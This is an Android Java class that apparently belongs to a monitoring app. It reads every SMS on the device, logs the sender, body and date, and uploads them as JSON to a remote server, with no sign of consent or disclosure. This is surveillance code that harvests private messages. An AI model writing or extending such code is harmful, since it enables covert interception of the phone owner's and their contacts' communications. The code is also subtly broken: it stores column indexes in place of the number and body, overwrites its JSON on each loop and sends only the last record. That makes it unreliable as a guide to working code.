package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ArchiveSms extends AsyncTask<Context, Void, Void> {
	ConvertDate date;
	Context mContext;
	private String LOG_TAG = "Arhive SMS";

	public void getSmsLogs() {
		try {
			// формируем JSONobj
			JSONObject AllSmsJson = new JSONObject();
			JSONObject archiveSMSJson = null;
			date = new ConvertDate();
			String sType = "null";
			Uri uri = Uri.parse("content://sms");
			Cursor sms_sent_cursor = mContext.getContentResolver().query(uri,
					null, null, null, null);
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					
					JSONObject infoCallJson;

					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
						// Type of call retrieved from the cursor.
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						Logging.doLog(LOG_TAG, "SMS Type : " + type);
						switch (type) {
						case 1:
							sType = "5";
							break;
						case 2:
							sType = "6";
							break;
						default:
							break;
						}
						Logging.doLog(
								LOG_TAG,
								sms_sent_cursor.getString(sms_sent_cursor
										.getColumnIndex("address"))
										+ sms_sent_cursor.getString(sms_sent_cursor
												.getColumnIndex("body"))
										+ date.getData(sms_sent_cursor.getLong(sms_sent_cursor
												.getColumnIndexOrThrow("date")))
										+ sType);

						try {
							archiveSMSJson = new JSONObject();
							infoCallJson = new JSONObject();

							archiveSMSJson
									.put("time",
											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveSMSJson.put("type", sType);
							infoCallJson.put("tel",
									sms_sent_cursor.getColumnIndex("address"));
							infoCallJson.put("duration",
									sms_sent_cursor.getColumnIndex("body"));
							archiveSMSJson.put("info", infoCallJson);
							AllSmsJson.put("data", archiveSMSJson);

						} catch (JSONException e) {
							// TODO Автоматически созданный блок catch
							e.printStackTrace();
						}
						sms_sent_cursor.moveToNext();
					}

				}
				sms_sent_cursor.close();
				if (AllSmsJson != null) {
					DataRequest dr = new DataRequest(mContext);
					dr.sendRequest(archiveSMSJson.toString());
					Logging.doLog(LOG_TAG, "Json" + AllSmsJson.toString());
				}
				// Log.d("JsonSms", AllCallJson.toString());

			} else
				Logging.doLog(LOG_TAG, "Send Cursor is Empty",
						"Send Cursor is Empty");
		} catch (Exception sggh) {
			Logging.doLog(LOG_TAG, "Error on onChange : " + sggh.toString(),
					"Error on onChange : " + sggh.toString());
		}

	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		Logging.doLog(LOG_TAG, mContext.toString());
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
